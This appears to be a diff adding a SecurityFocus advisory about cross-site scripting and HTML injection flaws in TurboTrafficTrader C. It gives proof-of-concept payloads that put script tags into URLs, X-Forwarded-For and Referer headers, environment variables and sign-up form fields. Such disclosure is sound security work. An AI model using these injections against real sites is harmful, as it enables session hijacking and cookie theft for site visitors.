@@ -1,0 +1,41 @@
+source: http://www.securityfocus.com/bid/10359/info
+
+It has been reported that TurboTrafficTrader C does not properly sanitize input received from users. It has been conjectured that this may allow a remote user to launch cross-site scripting and HTML injection attacks.
+
+The cross-site scripting issues could permit a remote attacker to create a malicious link to the vulnerable application that includes hostile HTML and script code. If this link were followed, the hostile code may be rendered in the web browser of the victim user.
+
+The HTML injection issues could allow an attacker to post malicious HTML and script code that would then later be rendered in the web browser of further visitors to the affected site.
+
+These attacks would occur in the security context of the affected web site and may allow for theft of cookie-based authentication credentials. Other attacks are also possible.
+
+http://www.example.com/cgi-bin/ttt-out?link=testing%20%3Cscript%3Ealert('from_browser_insert');%3C/script%3E
+http://www.example.com/cgi-bin/ttt-out?link=testing%20<script>alert('from_browser_insert');</script>
+
+export REMOTE_ADDR="127.0.0.1<script>alert('ip_inject');</script>"
+./ttt-in will load one bad record for IP
+export HTTP_X_FORWARDED_FOR="10.0.0.1<script>alert('proxy insertion');</script>" 
+./ttt-in will load an XXSed proxy record
+
+Raw connection example:
+telnet www.example.com 80
+Trying www.example.com...
+Connected to www.example.com.
+Escape character is '^]'.
+GET /cgi-bin/ttt-in HTTP/1.1
+X-Forwarded-For: 192.168.0.1<script>alert('proxy_insert');</script>
+Host: www.example.com
+
+telnet www.example.com 80
+Trying www.example.com...
+Connected to www.example.com.
+Escape character is '^]'.
+GET /cgi-bin/ttt-in HTTP/1.1
+X-Forwarded-For: 192.168.0.6<script>alert('proxy_insert');</script>
+Referer: http://www.referrer.com"<script>alert('referrer_inject');</script>"
+Host: www.example.com
+
+When signing up for a new account:
+Site name = Name"<script>window.open('http://www.example.com');</script>
+Site URL = http://www.example.com"<script>alert('name_inject');</script>
+Webmaster e-mail = email@example.com"<script>alert('email_inject');</script>
+Webmaster ICQ = 123456"<script>alert('ICQ_inject');</script>
